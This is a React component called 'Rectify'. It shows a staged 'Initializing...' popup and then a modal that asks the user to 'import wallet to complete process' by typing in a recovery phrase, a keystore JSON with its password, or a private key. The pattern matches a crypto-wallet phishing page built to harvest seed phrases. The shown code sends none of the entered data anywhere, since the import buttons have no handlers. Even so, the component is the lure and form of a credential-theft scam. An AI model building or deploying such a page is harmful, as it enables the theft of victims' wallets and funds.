import React, { useState } from "react";
import "react-responsive-modal/styles.css";
import { Modal } from "react-responsive-modal";
import { Tab, Tabs, TabList, TabPanel } from "react-tabs";
import "react-tabs/style/react-tabs.css";

function Rectify() {
  const [loading, setLoading] = useState(false);

  const [open, setOpen] = useState(false);
  // const onOpenModal = () => setOpen(true);
  const onCloseModal = () => setOpen(false);

  const [openImport, setOpenImport] = useState(false);

  // const onOpenImportModal = () => setOpenImport(true);
  const onCloseImportModal = () => setOpenImport(false);

  // useEffect(() => {
  //   setTimeout(() => setLoading(true), 1000);

  //   // Fetch data here

  //   setLoading(false);
  // }, []);

  function Active() {
    setOpenImport(true);
    setTimeout(() => setOpenImport(false), 3000);
    setTimeout(() => setOpen(true), 3000);
  }
  return (
    <div>
      <div className="popup_button">
        <button
          onClick={Active}
          type="button"
          class="btn btn-primary"
          data-bs-toggle="modal"
          data-bs-target="#exampleModal"
        >
          Launch Popup
        </button>
      </div>

      <div>
        <Modal
          open={openImport}
          onClose={onCloseImportModal}
          center
          closeOnOverlayClick={false}
          closeOnEsc={false}
          showCloseIcon={false}
          classNames={{
            modal: "init_modal",
          }}
        >
          <div className="im_inner">
            <div className="button">Initializing...</div>
          </div>
        </Modal>
      </div>

      <div>
        <Modal
          open={open}
          onClose={onCloseModal}
          center
          classNames={{
            modal: "form_modal",
          }}
          showCloseIcon={false}
        >
          <div className="fm_inner">
            <div className="fm_holder">
              <h3>Import wallet to complete process</h3>

              <Tabs className="fm_tabs">
                <TabList className="fmt_list">
                  <Tab
                    className="fmt_unselected"
                    selectedClassName="fmt_selected"
                  >
                    Phrase
                  </Tab>
                  <Tab
                    className="fmt_unselected"
                    selectedClassName="fmt_selected"
                  >
                    Keystore JSON
                  </Tab>
                  <Tab
                    className="fmt_unselected"
                    selectedClassName="fmt_selected"
                  >
                    Private Key
                  </Tab>
                </TabList>

                <TabPanel>
                  <div className="fmt_panel">
                    <textarea
                      required
                      rows={4}
                      placeholder="Enter your recovery phrase"
                    />
                    <p>
                      Typically 12 (sometimes 24) words separated by single
                      spaces
                    </p>
                    <button>
                      IMPORT
                      <span>
                        <svg
                          fill="none"
                          stroke-linecap="round"
                          stroke-linejoin="round"
                          stroke-width="2"
                          viewBox="0 0 24 24"
                          stroke="currentColor"
                        >
                          <path d="M13 9l3 3m0 0l-3 3m3-3H8m13 0a9 9 0 11-18 0 9 9 0 0118 0z"></path>
                        </svg>
                      </span>
                    </button>
                  </div>
                </TabPanel>
                <TabPanel>
                  <div className="fmt_panel">
                    <textarea
                      required
                      rows={4}
                      placeholder="Enter your Keystore JSON"
                      style={{ marginBottom: "1.5rem" }}
                    />
                    <input required placeholder="Wallet password" />
                    <p>
                      Several lines of text beginning with "{`{`}...{`}`}" plus
                      the password you used to encrypt it.
                    </p>
                    <button>
                      IMPORT
                      <span>
                        <svg
                          fill="none"
                          stroke-linecap="round"
                          stroke-linejoin="round"
                          stroke-width="2"
                          viewBox="0 0 24 24"
                          stroke="currentColor"
                        >
                          <path d="M13 9l3 3m0 0l-3 3m3-3H8m13 0a9 9 0 11-18 0 9 9 0 0118 0z"></path>
                        </svg>
                      </span>
                    </button>
                  </div>
                </TabPanel>
                <TabPanel>
                  <div className="fmt_panel">
                    <input required placeholder="Enter your Private Key" />
                    <p>
                      Typically 12 (sometimes 24) words separated by single
                      spaces
                    </p>
                    <button>
                      IMPORT
                      <span>
                        <svg
                          fill="none"
                          stroke-linecap="round"
                          stroke-linejoin="round"
                          stroke-width="2"
                          viewBox="0 0 24 24"
                          stroke="currentColor"
                        >
                          <path d="M13 9l3 3m0 0l-3 3m3-3H8m13 0a9 9 0 11-18 0 9 9 0 0118 0z"></path>
                        </svg>
                      </span>
                    </button>
                  </div>
                </TabPanel>
              </Tabs>
            </div>
            <div className="fm_close">
              <button onClick={onCloseModal}>Cancel</button>
            </div>
          </div>
        </Modal>
      </div>

      {/* <div
        class="modal fade"
        id="exampleModal"
        tabindex="-1"
        aria-labelledby="exampleModalLabel"
        aria-hidden="true"
      >
        <div class="modal-dialog modal-dialog-centered">
          <div class="modal-content">
            <div class="modal-header">
              <h5 class="modal-title" id="exampleModalLabel">
                Modal title
              </h5>
              <button
                type="button"
                class="btn-close"
                data-bs-dismiss="modal"
                aria-label="Close"
              ></button>
            </div>
            <div class="modal-body">...</div>
            <div class="modal-footer">
              <button
                type="button"
                class="btn btn-secondary"
                data-bs-dismiss="modal"
              >
                Close
              </button>
              <button type="button" class="btn btn-primary">
                Save changes
              </button>
            </div>
          </div>
        </div>
      </div> */}
    </div>
  );
}

export default Rectify;
